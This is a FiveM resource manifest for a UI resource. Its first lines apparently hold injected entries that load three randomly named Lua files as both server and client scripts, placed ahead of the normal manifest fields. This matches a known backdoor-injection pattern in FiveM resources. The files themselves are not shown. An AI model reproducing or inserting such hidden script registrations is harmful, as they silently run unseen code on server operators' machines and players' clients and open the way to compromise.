server_script "EVSBGNRRTE.lua"
client_script "EVSBGNRRTE.lua"
server_script "EXBEL7ZU3.lua"
client_script "EXBEL7ZU3.lua"
server_script "CBA3QONQKB2U.lua"
client_script "CBA3QONQKB2U.lua"
fx_version 'cerulean'
games { 'rdr3', 'gta5' }
author 'uNwinD, CallMeDaddy'

version '1.0.0'

-- What to run
client_scripts {
    'cl_main.lua',
}

files {
    'ui/*',
    'ui/assets/*'
}

ui_page 'ui/index.html'

export 'Open'